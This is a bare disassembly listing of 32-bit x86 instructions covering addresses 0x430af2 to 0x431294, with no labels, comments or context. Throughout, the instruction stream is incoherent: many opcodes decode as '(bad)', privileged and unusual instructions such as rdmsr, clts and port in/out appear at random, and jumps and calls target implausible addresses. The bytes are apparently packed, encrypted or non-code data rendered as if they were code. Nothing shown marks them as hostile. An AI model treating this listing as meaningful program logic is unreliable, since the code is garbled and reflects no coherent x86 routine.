  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
